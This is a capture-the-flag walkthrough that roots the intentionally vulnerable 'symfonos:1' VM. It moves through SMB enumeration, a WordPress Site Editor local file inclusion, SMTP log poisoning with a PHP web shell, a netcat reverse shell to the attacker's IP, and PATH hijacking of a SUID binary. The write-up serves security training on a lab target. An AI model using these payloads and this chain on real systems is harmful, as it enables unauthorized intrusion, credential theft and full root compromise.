symfonos:1 is a intermediate boot2root machine.
IP: 192.168.0.108

Lets enumerate the system and try to exploit it.

root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 -p- 192.168.0.108
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-23 19:32 IST
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.50% done; ETC: 19:33 (0:00:00 remaining)
Nmap scan report for 192.168.0.108
Host is up (0.0018s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/23%OT=22%CT=1%CU=33464%PV=Y%DS=2%DC=T%G=Y%TM=5F6B55B
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=8)OPS
OS:(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST1
OS:1NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C32D%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-09-23T09:03:02-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-23T14:03:02
|_  start_date: N/A


Comment : File source: https://commons.wikimedia.org/wiki/File:Peter_Paul_Rubens_-_The_Fall_of_Phaeton_(National_Gallery_of_Art).jpg


I did enum4linux scan for samba service running on port 139 and 445.

root@LAPTOP-U5913CMD:/home/akshay# enum4linux symfonos.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep 23 19:38:42 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... symfonos.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on symfonos.local    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for symfonos.local    |
 ============================================== 
Looking up status of 192.168.0.108
        SYMFONOS        <00> -         B <ACTIVE>  Workstation Service
        SYMFONOS        <03> -         B <ACTIVE>  Messenger Service
        SYMFONOS        <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on symfonos.local    |
 ======================================= 
[+] Server symfonos.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for symfonos.local    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on symfonos.local    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for symfonos.local from smbclient: 
[+] Got OS info for symfonos.local from srvinfo:
        SYMFONOS       Wk Sv PrQ Unx NT SNT Samba 4.5.16-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on symfonos.local    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: helios   Name:   Desc: 

user:[helios] rid:[0x3e8]

 =========================================== 
|    Share Enumeration on symfonos.local    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on symfonos.local
//symfonos.local/print$ Mapping: DENIED, Listing: N/A
//symfonos.local/helios Mapping: DENIED, Listing: N/A
//symfonos.local/anonymous      Mapping: OK, Listing: OK
//symfonos.local/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for symfonos.local    |
 ====================================================== 


[+] Attaching to symfonos.local using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SYMFONOS
        [+] Builtin

[+] Password Info for Domain: SYMFONOS

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on symfonos.local    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:


Found one user - > helios

root@LAPTOP-U5913CMD:/home/akshay# smbclient -N -L \\\\symfonos.local\\

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

root@LAPTOP-U5913CMD:/home/akshay# smbclient //symfonos.local/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 06:44:49 2019
  ..                                  D        0  Sat Jun 29 06:42:15 2019
  attention.txt                       N      154  Sat Jun 29 06:44:49 2019

                19994224 blocks of size 1024. 17299264 blocks available
smb: \> get attention.txt

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus


root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# smbclient -N -L \\\\symfonos.local\\

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available
root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# smbclient //symfonos.local/helios -U "helios"
Enter WORKGROUP\helios's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 29 06:02:05 2019
  ..                                  D        0  Sat Jun 29 06:07:04 2019
  research.txt                        A      432  Sat Jun 29 06:02:05 2019
  todo.txt                            A       52  Sat Jun 29 06:02:05 2019

                19994224 blocks of size 1024. 17299264 blocks available
smb: \> get research.txt
getting file \research.txt of size 432 as research.txt (46.9 KiloBytes/sec) (average 46.9 KiloBytes/sec)
smb: \> get todo.txt
getting file \todo.txt of size 52 as todo.txt (5.6 KiloBytes/sec) (average 26.3 KiloBytes/sec)
smb: \> 


So the user was helios and password for his personal share is "#####"

Found these two files ->

root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# ls
attention.txt  image.jpg  password.txt  research.txt  todo.txt  walkthrough.txt
root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# cat todo.txt 

1. Binge watch Dexter
2. Dance
3. Work on /h3l105

root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# 

/h3l105 might be the directory.


[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://symfonos.local/h3l105/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Sep 23 19:48:34 2020
[+] Requests Done: 29
[+] Cached Requests: 28
[+] Data Sent: 7.444 KB
[+] Data Received: 467.151 KB
[+] Memory used: 133.914 MB
[+] Elapsed time: 00:00:24
root@LAPTOP-U5913CMD:/home/akshay/Desktop/symsofosCTF# 


So admin is the user on wordpress so lets try to login using admin.


http://symfonos.local/h3l105/wp-content/uploads/siteeditor/

this directory is browsable.

lets search for siteditor exploit.
So I found this vulnerable plugin for wordpress website which includes LFI.
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion 


http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false Debian-exim:x:105:109::/var/spool/exim4:/bin/false messagebus:x:106:111::/var/run/dbus:/bin/false sshd:x:107:65534::/run/sshd:/usr/sbin/nologin helios:x:1000:1000:,,,:/home/helios:/bin/bash mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false postfix:x:109:115::/var/spool/postfix:/bin/false {"success":true,"data":{"output":[]}}


http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios

From root@symfonos.localdomain Fri Jun 28 21:08:55 2019 Return-Path: X-Original-To: root Delivered-To: root@symfonos.localdomain Received: by symfonos.localdomain (Postfix, from userid 0) id 3DABA40B64; Fri, 28 Jun 2019 21:08:54 -0500 (CDT) From: root@symfonos.localdomain (Cron Daemon) To: root@symfonos.localdomain Subject: Cron dhclient -nw MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: X-Cron-Env: X-Cron-Env: X-Cron-Env: Message-Id: <20190629020855.3DABA40B64@symfonos.localdomain> Date: Fri, 28 Jun 2019 21:08:54 -0500 (CDT) /bin/sh: 1: dhclient: not found From MAILER-DAEMON Wed Sep 23 14:30:14 2020 Return-Path: <> X-Original-To: helios@symfonos.localdomain Delivered-To: helios@symfonos.localdomain Received: by symfonos.localdomain (Postfix) id 967C740B76; Wed, 23 Sep 2020 14:30:14 -0500 (CDT) Date: Wed, 23 Sep 2020 14:30:14 -0500 (CDT) From: MAILER-DAEMON@symfonos.localdomain (Mail Delivery System) Subject: Undelivered Mail Returned to Sender To: helios@symfonos.localdomain Auto-Submitted: auto-replied MIME-Version: 1.0 Content-Type: multipart/report; report-type=delivery-status; boundary="2EE7C40AB0.1600889414/symfonos.localdomain" Content-Transfer-Encoding: 8bit Message-Id: <20200923193014.967C740B76@symfonos.localdomain> This is a MIME-encapsulated message. --2EE7C40AB0.1600889414/symfonos.localdomain Content-Description: Notification Content-Type: text/plain; charset=utf-8 Content-Transfer-Encoding: 8bit This is the mail system at host symfonos.localdomain. I'm sorry to have to inform you that your message could not be delivered to one or more recipients. It's attached below. For further assistance, please send mail to postmaster. If you do so, please include this problem report. You can delete your own text from the attached returned message. The mail system : Host or domain name not found. Name service error for name=blah.com type=MX: Host not found, try again --2EE7C40AB0.1600889414/symfonos.localdomain Content-Description: Delivery report Content-Type: message/delivery-status Reporting-MTA: dns; symfonos.localdomain X-Postfix-Queue-ID: 2EE7C40AB0 X-Postfix-Sender: rfc822; helios@symfonos.localdomain Arrival-Date: Fri, 28 Jun 2019 19:46:02 -0500 (CDT) Final-Recipient: rfc822; helios@blah.com Original-Recipient: rfc822;helios@blah.com Action: failed Status: 4.4.3 Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error for name=blah.com type=MX: Host not found, try again --2EE7C40AB0.1600889414/symfonos.localdomain Content-Description: Undelivered Message Content-Type: message/rfc822 Content-Transfer-Encoding: 8bit Return-Path: Received: by symfonos.localdomain (Postfix, from userid 1000) id 2EE7C40AB0; Fri, 28 Jun 2019 19:46:02 -0500 (CDT) To: helios@blah.com Subject: New WordPress Site X-PHP-Originating-Script: 1000:class-phpmailer.php Date: Sat, 29 Jun 2019 00:46:02 +0000 From: WordPress Message-ID: <65c8fc37d21cc0046899dadd559f3bd1@192.168.201.134> X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer) MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Your new WordPress site has been successfully set up at: http://192.168.201.134/h3l105 You can log in to the administrator account with the following information: Username: admin Password: The password you chose during installation. Log in here: http://192.168.201.134/h3l105/wp-login.php We hope you enjoy your new site. Thanks! --The WordPress Team https://wordpress.org/ --2EE7C40AB0.1600889414/symfonos.localdomain-- {"success":true,"data":{"output":[]}}

Lets try to upload php GET command.

root@LAPTOP-U5913CMD:/home/akshay# telnet 192.168.0.108 25
Trying 192.168.0.108...
Connected to 192.168.0.108.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM:<mark>
250 2.1.0 Ok
RCPT TO: Helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as 36BE140698


http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=id

uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev) {"success":true,"data":{"output":[]}}

Lets use netcat to get a reverse shell
-> nc 192.168.0.106 1234 -e /bin/sh

C:\Users\Voker\Downloads\netcat-win32-1.12>nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.108] 48932
id
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

Lets make this shell stable using python.

python -c "import pty;pty.spawn('/bin/bash')"

Got this in wp-config.php file.
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

Nada... :(
I searched for SUID files using the following command:

helios@symfonos:/$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping

/opt/statuscheck looks interesting and can be a way to root shell.

helios@symfonos:/opt$ strings statuscheck
strings statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL

curl -I H 

curl can be used to spawn a root shell.

echo '/bin/sh' > /tmp/curl
chmod 777 /tmp/curl
export PATH=/tmp:$PATH
./statuscheck
helios@symfonos:/opt$ ./statuscheck
./statuscheck
# id
id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
# whoami
whoami
root

# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/,
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \
                  ;;;;'     (      ---~~/         `:::|       `\\.
                  |'  _      `----~~~~'      /      `:|        ()))),
            ______/\/~    |                 /        /         (((((())
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   (
        //  \ \                        /  |  \;;,\                 `
       (<_    \ \                    /',/-----'  _>
        \_|     \\_                 //~;~~~~~~~~~
                 \_|               (,~~
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!


# echo 'Thank you..Happy Hacking' > signing_out.txt 